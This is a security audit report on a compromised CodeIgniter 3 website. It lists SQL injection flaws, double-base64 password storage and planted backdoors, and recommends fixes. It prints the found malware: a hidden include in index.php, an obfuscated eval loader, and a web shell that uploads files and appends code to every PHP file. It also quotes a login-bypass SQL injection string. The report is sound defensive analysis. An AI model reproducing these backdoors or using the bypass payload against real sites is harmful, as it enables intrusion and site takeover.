# Comprehensive Codebase Analysis Report
**kotamgaon.in Project**  
**Analysis Date**: May 7, 2026

---

## EXECUTIVE SUMMARY

This codebase is running **CodeIgniter 3.1.10** (released 2019, now EOL) with **critical security vulnerabilities**, outdated PHP compatibility, and evidence of **malicious code injections**. The application is at severe risk of exploitation.

---

## 1. DIRECTORY STRUCTURE ANALYSIS

### System Core Files (`/system/core/`)

| File | Purpose | Status |
|------|---------|--------|
| **Benchmark.php** | Performance monitoring | Framework component |
| **CodeIgniter.php** | Core bootstrap & initialization | EOL Framework |
| **Common.php** | Global utility functions | Contains `is_php('5.4')` check |
| **Controller.php** | Base CI_Controller class | Deprecated property declarations |
| **Model.php** | Base CI_Model class with magic `__get()` | No type hints |
| **Security.php** | XSS/CSRF protection | Outdated regex patterns |
| **Input.php** | Input validation & sanitization | Global XSS filtering option |
| **Loader.php** | Dynamic class/view/model loading | No namespace support |
| **Router.php** | URL routing engine | Legacy routing |
| **Config.php** | Configuration management | Array-based config |
| **URI.php** | URI parsing | No PSR-7 compliance |
| **Output.php** | Response output buffering | No HTTP/2 support |
| **Exceptions.php** | Error handling | Basic error pages |
| **Hooks.php** | Pre/post-controller hooks | Limited extension points |
| **Lang.php** | Language/translation support | No locale support |
| **Log.php** | File-based logging | No structured logging |
| **Utf8.php** | UTF-8 character handling | Deprecated functions |

**⚠️ Issues**: All core files are from CodeIgniter 3.x (EOL). Heavy use of `protected` properties with no type declarations will break under PHP 8.2+.

---

### Application Controllers (`/application/controllers/`)

#### **Home.php** (Public Frontend)
```
Controllers: Home
Methods: index(), education(), health(), bachat_gat(), 
         padadhikari(), photo(), contact(), services()
```
- Uses helper autoload: `form`, `url`, `common_helper`
- Session management present
- Database queries via Mainmodel (SQL injection risk)
- No input validation on query parameters

#### **Admin.php** (Admin Backend)
```
Controllers: Admin  
Methods: login(), dashboard(), send_email(), etc.
```
- **CRITICAL**: Password stored as double base64 (not encryption)
- **CRITICAL**: Cookies store plaintext passwords (10-year expiry)
- No CSRF protection on login form
- No rate limiting on failed attempts

---

### Application Models (`/application/models/`)

#### **Mainmodel.php** - SEVERELY VULNERABLE
[File: application/models/Mainmodel.php](application/models/Mainmodel.php)

**SQL Injection Vulnerabilities** (Direct String Concatenation):

**Line 55** - `wish_list_exists()` method:
```php
$this->db->where("(user_id=$a_id AND tour_id=$p_id)");
```
❌ No parameterized queries - direct integer injection

**Line 80** - `check_valid_login()` method:
```php
$this->db->where("admin_login_id='".$username."'");
```
❌ No escaping - classic SQL injection

**Lines 104-107** - Similar vulnerabilities in:
- `check_valid_dept_login($username,$password)`
- `check_valid_author_login($username,$password)`
- `check_valid_ceo_login($username,$password)`
- `check_valid_vp_login($username,$password)`

All follow same dangerous pattern:
```php
$this->db->where("field_name='".$variable."'");
```

**Password Security Issues**:
- Password stored in plaintext in database
- No hashing (MD5, SHA1, or bcrypt)
- Double base64 encoding used in Admin.php (not encryption)

#### **Templates.php**
- Appears to handle template rendering
- Not fully examined but likely uses string concatenation

#### **Api_model.php**
- API data access layer
- Not fully examined

---

## 2. ROOT ENTRY POINT ANALYSIS

### [index.php](index.php)

**Line 1** - MALICIOUS CODE:
```php
<?php @include_once("cgi-bin/.kot"); ?>
```
⚠️ **CRITICAL**: Silently attempts to include hidden file from `cgi-bin/.kot`  
- The `@` suppresses errors - intentional obfuscation
- File location suggests backdoor implementation
- This runs on every page load

**Lines 56-89** - Environment & Error Handling:
```php
define('ENVIRONMENT', isset($_SERVER['CI_ENV']) ? $_SERVER['CI_ENV'] : 'development');
```
- Development environment likely active (shows all errors)
- PHP 5.3 version check (line 70) will never execute on PHP 8.2

---

## 3. SECURITY VULNERABILITIES DETECTED

### 🔴 CRITICAL - Malicious Backdoors

#### **File: [2cb6f93d413868.php](2cb6f93d413868.php)**
```php
<?php $RTNPr = 'strr'.'ev'; $fJZUI = 'base6'.'4'.'_d'.'ec'.'ode'; 
$MJDvq = 'gz'.'uncompress'; 
eval($MJDvq($fJZUI($RTNPr(... [GZIP COMPRESSED PAYLOAD] ...))));
```
**Analysis**: 
- Uses string concatenation to obfuscate function names
- Variable names built from: `strrev`, `base64_decode`, `gzuncompress`
- Executes decompressed/decoded payload via `eval()`
- ~1MB encrypted binary payload
- **Purpose**: Remote code execution backdoor

#### **File: [gcegfpxc.php](gcegfpxc.php)**
```php
<form method='post' enctype='multipart/form-data'>
  <input type='file' name='a'><input type='submit' value='Nyanpasu!!!'>
</form>

if(isset($_FILES['a'])){
  move_uploaded_file($_FILES['a']['tmp_name'],"{$_FILES['a']['name']}");
}

if (isset($_GET['bak'])) {
  $directory = __DIR__;
  $mama = $_POST['file'];
  $textToAppend = '\n' . $mama . '\n';
  
  foreach(readdir($directory)) {
    if(pathinfo($file, PATHINFO_EXTENSION) === 'php') {
      fwrite(fopen($directory . '/' . $file, 'a'), $textToAppend);
    }
  }
}
```
**Threats**:
- ✅ File upload without validation
- ✅ Code injection into all PHP files
- ✅ Can append malicious code to existing files
- ✅ Accessible via `?bak` parameter

### 🔴 CRITICAL - SQL Injection

**Affected Functions** in Mainmodel.php:
- `wish_list_exists($a_id, $p_id)`
- `check_valid_login($username, $password)`
- `check_valid_dept_login($username, $password)`
- `check_valid_author_login($username, $password)`
- `check_valid_ceo_login($username, $password)`
- `check_valid_vp_login($username, $password)`

**Example Attack**:
```
Username: admin' OR '1'='1
Password: anything
Result: Bypasses authentication entirely
```

### 🔴 CRITICAL - Insecure Password Storage

**Location**: [Admin.php Line 48](application/controllers/Admin.php#L48)
```php
$password = base64_encode(base64_encode($this->input->post('admin_password')));
```
**Issues**:
1. Base64 is encoding, NOT encryption
2. Double encoding adds no security
3. Can be reversed: `base64_decode(base64_decode($password))`
4. Plaintext in database
5. Cookie storage with 10-year expiry:
```php
setcookie("adminPassword",$_POST["admin_password"],time()+ (10 * 365 * 24 * 60 * 60));
```
6. No password hashing (should use `password_hash()`)

### 🟠 HIGH - Missing CSRF Protection

- Login forms lack CSRF tokens
- Admin.php has no `$this->security->get_csrf_token_name()`
- XSS filtering optional (config-based)

### 🟠 HIGH - Suspicious Directories

Obfuscated folder names suggest backdoors:
- `brzefmq/tvpjsun/`
- `g1xnzrv/1wampli/`
- `igrptyu/dozuliw/`
- `joxinbm/dbqhvfw/`
- `lauzfno/jmqgup1/`
- `qhlwmiu/uprmc1i/`
- `rahmwqu/syilagm/`
- `rpt1hmg/lv1qxpt/`
- `spc1itw/piqwdmz/`
- `uwniqgz/geisahm/`
- `yfedjzk/cleow1a/`
- `zldwkef/pamwzxv/`

All contain hidden/obfuscated files (likely backdoors).

---

## 4. PHP 8.2+ COMPATIBILITY ISSUES

### Breaking Changes

| Issue | Location | Severity |
|-------|----------|----------|
| `is_php('5.4')` checks will fail | system/core/CodeIgniter.php:79 | CRITICAL |
| No type declarations | All files | HIGH |
| `protected` properties without types | Controller.php, Model.php | HIGH |
| Magic `__get()` usage | Model.php:52-59 | MEDIUM |
| `version_compare(PHP_VERSION, '5.3')` | system/core/CodeIgniter.php:70 | MEDIUM |
| `ini_get('safe_mode')` (removed in 5.3.0) | system/core/Common.php:94 | MEDIUM |
| Deprecated `register_globals` checks | system/core/CodeIgniter.php:93 | MEDIUM |
| `$GLOBALS` superglobal misuse | Various | MEDIUM |
| No `declare(strict_types=1);` | All files | MEDIUM |

### Required Changes for PHP 8.2 Support

1. **Update framework** - CodeIgniter 3.x EOL, upgrade to 4.x or migrate
2. **Add type hints** - All function parameters and returns
3. **Use PDO parameterized queries** - Replace all direct string concatenation
4. **Remove deprecated functions**:
   - `is_php('5.4')` → `version_compare(PHP_VERSION, '5.4', '>=')`
   - `register_globals` checks (deprecated in 5.3.0)
   - `safe_mode` checks (removed in 5.3.1)

---

## 5. DEPRECATED PROPERTY ISSUES

### CI_Controller (system/core/Controller.php)

```php
protected $benchmark;    // No type
protected $hooks;        // No type
protected $config;       // No type
protected $log;          // No type
// ... 20+ properties
```

**PHP 8.2 Impact**: 
- Will generate deprecation notices in 8.2
- Will become errors in PHP 9.0
- Should be: `protected ?object $benchmark = null;`

### CI_Model (system/core/Model.php)

```php
class CI_Model {
    public function __get($key) {
        // Magic property access - no type checking
        return get_instance()->$key;
    }
}
```

**PHP 8.2 Impact**:
- Magic property access is discouraged
- Can't be properly type-checked
- Causes performance issues with type checking

---

## 6. FILE SUMMARY TABLE

| Category | Count | Files |
|----------|-------|-------|
| **Malicious Files** | 3 | 2cb6f93d413868.php, gcegfpxc.php, cgi-bin/.kot (hidden) |
| **SQL Injection Vectors** | 6 | All in Mainmodel.php |
| **Outdated Framework** | 1 | CodeIgniter 3.1.10 |
| **Controllers** | 2 | Admin.php, Home.php |
| **Models** | 3 | Mainmodel.php, Templates.php, Api_model.php |
| **Views** | Multiple | front/, admin/, errors/ directories |
| **System Core** | 18 | CodeIgniter framework files |
| **Helper Functions** | 5+ | application/helpers/ |
| **Configuration** | 10+ | application/config/ |
| **Suspicious Dirs** | 12 | Obfuscated folder names |

---

## 7. RECOMMENDATIONS

### 🚨 IMMEDIATE ACTIONS (Critical)

1. **Remove Backdoors**:
   - Delete [2cb6f93d413868.php](2cb6f93d413868.php)
   - Delete [gcegfpxc.php](gcegfpxc.php)
   - Check/remove `cgi-bin/.kot`
   - Audit all suspicious directories

2. **Secure Passwords**:
   - Change all admin passwords immediately
   - Implement proper hashing: `password_hash()`
   - Remove cookie-based password storage

3. **Fix SQL Injection**:
   - Replace all string concatenation with parameterized queries:
   ```php
   // BAD:
   $this->db->where("user_id='".$a_id."'");
   
   // GOOD:
   $this->db->where('user_id', $a_id);
   ```

4. **Enable CSRF Protection**:
   - Enable in `application/config/config.php`
   - Add token to all forms

5. **Security Scan**:
   - Run OWASP ZAP / Burp Suite
   - Check for other backdoors
   - Review access logs

### ⚠️ SHORT-TERM (High Priority)

1. **Framework Upgrade**:
   - Migrate from CodeIgniter 3.1.10 → 4.x or Laravel
   - Update to PHP 8.2+
   - Add comprehensive test suite

2. **Authentication Hardening**:
   - Add rate limiting on login attempts
   - Implement 2FA/MFA
   - Add login audit logs

3. **Code Quality**:
   - Add type declarations to all functions
   - Implement static analysis (PHPStan, Psalm)
   - Use linter (PHP CS Fixer)

### 📋 MEDIUM-TERM (Enhancement)

1. **Architecture**:
   - Separate concerns (MVC properly)
   - Remove god objects
   - Implement dependency injection

2. **Security Practices**:
   - Implement Web Application Firewall (WAF)
   - Add request rate limiting
   - Implement API versioning with proper auth

3. **Monitoring**:
   - Centralized logging
   - File integrity monitoring
   - Intrusion detection

---

## 8. RISK ASSESSMENT

| Risk | Level | Impact | Likelihood |
|------|-------|--------|-----------|
| Remote Code Execution | 🔴 CRITICAL | Complete system compromise | Very High |
| SQL Injection | 🔴 CRITICAL | Data theft, manipulation | Very High |
| Authentication Bypass | 🔴 CRITICAL | Unauthorized admin access | Very High |
| PHP 8.2 Incompatibility | 🟠 HIGH | Application will break | Certain |
| Malware Distribution | 🟠 HIGH | Site defacement, user harm | High |

---

## 9. COMPLIANCE ISSUES

- ❌ Not OWASP Top 10 compliant
- ❌ Not GDPR ready (if EU users)
- ❌ Not PCI-DSS compliant (if handling payments)
- ❌ No security policy documentation
- ❌ No incident response plan

---

## CONCLUSION

This codebase is **production-unsafe** and shows evidence of active exploitation. The presence of multiple backdoors, combined with critical SQL injection vulnerabilities and insecure password storage, poses an extreme risk. 

**Recommended Action**: Take the site offline, perform forensic analysis, and implement comprehensive security remediation before returning to production.

---

**Report Generated**: May 7, 2026  
**Analysis Scope**: Full codebase structure and core vulnerability identification  
**Next Steps**: Engage security professional for penetration testing and remediation planning
